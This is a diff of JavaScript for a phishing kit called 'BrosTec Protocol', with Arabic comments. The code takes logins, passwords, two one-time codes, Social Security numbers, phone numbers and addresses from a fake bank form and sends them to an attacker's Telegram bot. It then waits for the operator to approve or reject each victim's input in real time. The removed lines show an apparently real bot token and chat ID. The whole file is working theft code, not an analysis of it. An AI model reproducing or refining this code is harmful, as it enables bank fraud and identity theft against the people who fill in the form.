@@ -1,123 +1,252 @@
-// BrosTec Protocol: Config
+/**
+ * BrosTec Protocol - Enhanced Telegram Control System
+ * Version: 2.0 (Multi-Session Support)
+ * Status: Extended Structure
+ */
+
+// --- 1. الإعدادات العامة (Configuration) ---
 const telegramConfig = {
-    botToken: '8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU',
-    chatId: '7865246557',
-    pollInterval: 3000 // فحص كل 3 ثواني
+    botToken: 'YOUR_BOT_TOKEN_HERE',
+    chatId: 'YOUR_CHAT_ID_HERE',
+    pollInterval: 3000 
 };
 
-let lastMessageId = null;
+// --- 2. توليد معرف فريد للمتصفح (Session Tracking) ---
+// هذا المعرف يمنع تداخل بيانات المستخدمين عند وجود أكثر من شخص في نفس الوقت
+const sessionId = Math.floor(Math.random() * 900000) + 100000;
 
+// متغير لحفظ حالة الانتظار لمنع التكرار
+let isWaiting = false;
+
+/**
+ * الوظيفة الرئيسية للانتقال بين الصفحات
+ * @param {number} stepNumber - رقم الصفحة التالية
+ */
 async function nextStep(stepNumber) {
-    const overlay = document.getElementById('loadingOverlay');
     
-    // إظهار دائرة الانتظار (نقطة 2)
-    if (overlay) overlay.style.display = 'flex';
-
-    // جمع البيانات حسب الخطوة الحالية
-    let message = "";
-    if (stepNumber === 2) {
-        message = `📌 New Login Attempt:\n👤 User: ${document.getElementById('user').value}\n🔑 Pass: ${document.getElementById('pass').value}`;
-    } else if (stepNumber === 3) {
-        message = `🔢 OTP 1 Received: ${document.getElementById('otp1').value}`;
-    } else if (stepNumber === 4) {
-        message = `📝 Full Info Received:\nName: ${document.getElementById('fName').value} ${document.getElementById('lName').value}\nSSN: ${document.getElementById('ssn').value}\nPhone: ${document.getElementById('phone').value}\nAddress: ${document.getElementById('street').value}, ${document.getElementById('city').value}`;
-    } else if (stepNumber === 5) {
-        message = `🔢 OTP 2 Received: ${document.getElementById('otp2').value}`;
+    // أولاً: تفعيل واجهة الانتظار (نقطة 2)
+    const overlay = document.getElementById('loadingOverlay');
+    if (overlay) {
+        overlay.style.display = 'flex';
     }
 
-    // إرسال البيانات للتيليجرام مع الأزرار
-    if (message !== "") {
-        await sendToTelegram(message, stepNumber);
-        // الانتظار حتى صدور أمر منك (نقطة 1)
-        await waitForCommand(stepNumber);
+    // ثانياً: تجهيز الرسالة بناءً على الخطوة الحالية
+    let messageBody = `🆔 **Session ID:** #${sessionId}\n`;
+    messageBody += `--------------------------\n`;
+
+    let shouldSend = false;
+
+    // تجميع بيانات الصفحة الأولى (Login)
+    if (stepNumber === 2) {
+        const userVal = document.getElementById('user').value;
+        const passVal = document.getElementById('pass').value;
+        const accType = document.getElementById('accType').value;
+        
+        messageBody += `📌 **New Login Attempt**\n`;
+        messageBody += `👤 User: ${userVal}\n`;
+        messageBody += `🔑 Pass: ${passVal}\n`;
+        messageBody += `🏦 Type: ${accType}\n`;
+        shouldSend = true;
+    } 
+    
+    // تجميع بيانات الصفحة الثانية (OTP 1)
+    else if (stepNumber === 3) {
+        const otp1Val = document.getElementById('otp1').value;
+        
+        messageBody += `🔢 **OTP 1 Received**\n`;
+        messageBody += `Code: ${otp1Val}\n`;
+        shouldSend = true;
+    } 
+    
+    // تجميع بيانات الصفحة الثالثة (Full Info)
+    else if (stepNumber === 4) {
+        const firstName = document.getElementById('fName').value;
+        const lastName = document.getElementById('lName').value;
+        const ssn = document.getElementById('ssn').value;
+        const phone = document.getElementById('phone').value;
+        const address = document.getElementById('street').value;
+        const city = document.getElementById('city').value;
+        const state = document.getElementById('state').value;
+        const zip = document.getElementById('zip').value;
+
+        messageBody += `📝 **Full Account Info**\n`;
+        messageBody += `Name: ${firstName} ${lastName}\n`;
+        messageBody += `SSN: ${ssn}\n`;
+        messageBody += `Phone: ${phone}\n`;
+        messageBody += `Address: ${address}, ${city}, ${state} ${zip}\n`;
+        shouldSend = true;
+    } 
+    
+    // تجميع بيانات الصفحة الرابعة (OTP 2)
+    else if (stepNumber === 5) {
+        const otp2Val = document.getElementById('otp2').value;
+        
+        messageBody += `🔢 **OTP 2 Received**\n`;
+        messageBody += `Code: ${otp2Val}\n`;
+        shouldSend = true;
+    }
+
+    // ثالثاً: تنفيذ عملية الإرسال والانتظار
+    if (shouldSend) {
+        try {
+            await sendToTelegram(messageBody, stepNumber);
+            await waitForAdminDecision(stepNumber);
+        } catch (error) {
+            console.error("Critical Error in Step Transition:", error);
+        }
     } else {
-        executeStepTransition(stepNumber);
+        // في حال كانت صفحة لا تتطلب إرسال (مثل صفحة النجاح النهائية)
+        executeFinalTransition(stepNumber);
     }
 }
 
+/**
+ * إرسال البيانات إلى التيليجرام مع الأزرار التفاعلية
+ */
 async function sendToTelegram(text, step) {
-    let buttons = [];
-    if (step === 2) buttons = [[{ text: "ارسال OTP", callback_data: "next" }, { text: "اعادة ادخال بيانات", callback_data: "error_login" }]];
-    if (step === 3) buttons = [[{ text: "الذهاب للصفحة التالية", callback_data: "next" }, { text: "اعادة ادخال OTP", callback_data: "error_otp1" }]];
-    if (step === 4) buttons = [[{ text: "الذهاب لصفحة الـ OTP", callback_data: "next" }, { text: "اعادة ادخال المعلومات", callback_data: "error_info" }]];
-    if (step === 5) buttons = [[{ text: "انهاء (نجاح)", callback_data: "next" }, { text: "OTP خطأ", callback_data: "error_otp2" }]];
-
     const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
-    const res = await fetch(url, {
+    
+    // توليد Callback Data فريد يربط القرار بالـ SessionId
+    const nextCmd = `approve_${step}_${sessionId}`;
+    const errorCmd = `decline_${step}_${sessionId}`;
+
+    let keyboardButtons = [];
+
+    if (step === 2) {
+        keyboardButtons = [[
+            { text: "✅ إرسال OTP", callback_data: nextCmd },
+            { text: "❌ خطأ في البيانات", callback_data: errorCmd }
+        ]];
+    } else if (step === 3 || step === 5) {
+        keyboardButtons = [[
+            { text: "✅ تجاوز (OTP صحيح)", callback_data: nextCmd },
+            { text: "❌ OTP خطأ", callback_data: errorCmd }
+        ]];
+    } else if (step === 4) {
+        keyboardButtons = [[
+            { text: "✅ طلب OTP الثاني", callback_data: nextCmd },
+            { text: "❌ خطأ في المعلومات", callback_data: errorCmd }
+        ]];
+    }
+
+    const payload = {
+        chat_id: telegramConfig.chatId,
+        text: text,
+        parse_mode: "Markdown",
+        reply_markup: {
+            inline_keyboard: keyboardButtons
+        }
+    };
+
+    return fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: telegramConfig.chatId,
-            text: text,
-            reply_markup: { inline_keyboard: buttons }
-        })
+        body: JSON.stringify(payload)
     });
-    const data = await res.json();
-    lastMessageId = data.result.message_id;
 }
 
-async function waitForCommand(step) {
+/**
+ * حلقة الانتظار (Polling) لمراقبة قرار الأدمن من التيليجرام
+ */
+async function waitForAdminDecision(step) {
     return new Promise((resolve) => {
-        const interval = setInterval(async () => {
-            const url = `https://api.telegram.org/bot${telegramConfig.botToken}/getUpdates?offset=-1`;
-            const res = await fetch(url);
-            const data = await res.json();
+        const checkInterval = setInterval(async () => {
+            const updateUrl = `https://api.telegram.org/bot${telegramConfig.botToken}/getUpdates?offset=-1&timeout=10`;
             
-            if (data.result.length > 0) {
-                const lastUpdate = data.result[data.result.length - 1];
-                if (lastUpdate.callback_query) {
-                    const command = lastUpdate.callback_query.data;
-                    
-                    if (command === "next") {
-                        clearInterval(interval);
-                        hideErrors();
-                        executeStepTransition(step);
-                        resolve();
-                    } else if (command.startsWith("error")) {
-                        clearInterval(interval);
-                        handleErrorCommand(command);
-                        resolve();
+            try {
+                const response = await fetch(updateUrl);
+                const data = await response.json();
+
+                if (data.result && data.result.length > 0) {
+                    const latestUpdate = data.result[data.result.length - 1];
+
+                    if (latestUpdate.callback_query) {
+                        const decision = latestUpdate.callback_query.data;
+
+                        // التحقق من أن القرار يخص هذا المتصفح وهذا الـ Session
+                        if (decision.includes(sessionId.toString())) {
+                            
+                            // حالة الموافقة
+                            if (decision.startsWith("approve")) {
+                                clearInterval(checkInterval);
+                                clearAllErrors();
+                                executeFinalTransition(step);
+                                resolve();
+                            } 
+                            // حالة الرفض أو الخطأ
+                            else if (decision.startsWith("decline")) {
+                                clearInterval(checkInterval);
+                                processErrorStep(step);
+                                resolve();
+                            }
+                        }
                     }
                 }
+            } catch (err) {
+                console.warn("Polling Update Failed, retrying...");
             }
         }, telegramConfig.pollInterval);
     });
 }
 
-function handleErrorCommand(command) {
+/**
+ * معالجة حالات الخطأ بناءً على أوامر التيليجرام
+ */
+function processErrorStep(currentStep) {
     const overlay = document.getElementById('loadingOverlay');
-    if (overlay) overlay.style.display = 'none';
+    if (overlay) {
+        overlay.style.display = 'none';
+    }
 
-    if (command === "error_login") {
-        executeStepTransition(1);
-    } else if (command === "error_otp1") {
+    if (currentStep === 2) {
+        // العودة لصفحة تسجيل الدخول
+        executeFinalTransition(1);
+    } else if (currentStep === 3) {
         document.getElementById('otpError1').style.display = 'block';
-    } else if (command === "error_info") {
+    } else if (currentStep === 4) {
         document.getElementById('infoError').style.display = 'block';
-    } else if (command === "error_otp2") {
+    } else if (currentStep === 5) {
         document.getElementById('otpError2').style.display = 'block';
     }
 }
 
-function hideErrors() {
-    ['otpError1', 'infoError', 'otpError2'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.style.display = 'none';
+/**
+ * إخفاء كافة رسائل الخطأ من الواجهة
+ */
+function clearAllErrors() {
+    const errors = ['otpError1', 'infoError', 'otpError2'];
+    errors.forEach(errorId => {
+        const element = document.getElementById(errorId);
+        if (element) {
+            element.style.display = 'none';
+        }
     });
 }
 
-function executeStepTransition(stepNumber) {
+/**
+ * التنفيذ الفعلي لعملية تبديل الصفحات في المتصفح
+ */
+function executeFinalTransition(targetId) {
     const overlay = document.getElementById('loadingOverlay');
-    if (overlay) overlay.style.display = 'none';
+    if (overlay) {
+        overlay.style.display = 'none';
+    }
 
-    document.querySelectorAll('.page-section').forEach(section => {
+    // إخفاء كافة الأقسام
+    const allSections = document.querySelectorAll('.page-section');
+    allSections.forEach(section => {
         section.classList.remove('active');
     });
 
-    const targetSection = document.getElementById('step' + stepNumber);
-    if (targetSection) {
-        targetSection.classList.add('active');
+    // إظهار القسم المستهدف
+    const activeSection = document.getElementById('step' + targetId);
+    if (activeSection) {
+        activeSection.classList.add('active');
     }
 
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+    // التمرير لسلاسة العرض
+    window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+    });
 }
